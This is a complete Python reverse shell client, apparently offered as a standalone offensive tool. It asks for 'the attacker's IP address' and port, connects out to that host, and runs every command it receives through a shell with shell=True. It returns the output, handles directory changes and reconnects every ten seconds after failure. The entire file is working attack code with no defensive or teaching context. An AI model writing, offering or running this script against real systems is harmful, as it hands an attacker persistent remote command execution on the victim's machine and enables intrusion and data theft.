#!/usr/bin/env python3

import socket
import subprocess
import os
import time

# Configuration
RECONNECT_DELAY = 10  # seconds

def get_connection_details():
    server_ip = input("Enter the attacker's IP address: ").strip()
    server_port = input("Enter the attacker's port: ").strip()
    if not server_port.isdigit():
        print("[ERROR] Port must be a number.")
        exit(1)
    return server_ip, int(server_port)

def connect(server_ip, server_port):
    while True:
        try:
            # Create a socket object
            print("[INFO] Creating socket...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the server
            print(f"[INFO] Connecting to {server_ip}:{server_port}...")
            s.connect((server_ip, server_port))
            print("[INFO] Connected to server.")

            # Receive commands from the server
            while True:
                print("[INFO] Waiting for command...")
                command = s.recv(1024).decode().strip()
                print(f"[INFO] Received command: {command}")

                if command.lower() == 'exit':
                    s.send(b"Connection closed by client\n")
                    break
                elif command.startswith('cd '):
                    try:
                        directory = command[3:].strip()
                        os.chdir(directory)
                        response = f"Changed directory to {os.getcwd()}\n"
                        print(f"[INFO] {response}")
                        s.send(response.encode())
                    except Exception as e:
                        response = f"Error changing directory: {e}\n"
                        print(f"[ERROR] {response}")
                        s.send(response.encode())
                else:
                    try:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                        if not output:
                            response = "Command executed successfully, but there is no output.\n"
                        else:
                            response = output.decode()
                        print(f"[INFO] {response}")
                        s.send(response.encode())
                    except subprocess.CalledProcessError as e:
                        response = f"Command failed: {e.output.decode()}\n"
                        print(f"[ERROR] {response}")
                        s.send(response.encode())
                    except Exception as e:
                        response = f"Error executing command: {e}\n"
                        print(f"[ERROR] {response}")
                        s.send(response.encode())
            s.close()
        except Exception as e:
            print(f"[ERROR] Connection error: {e}")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    server_ip, server_port = get_connection_details()
    connect(server_ip, server_port)

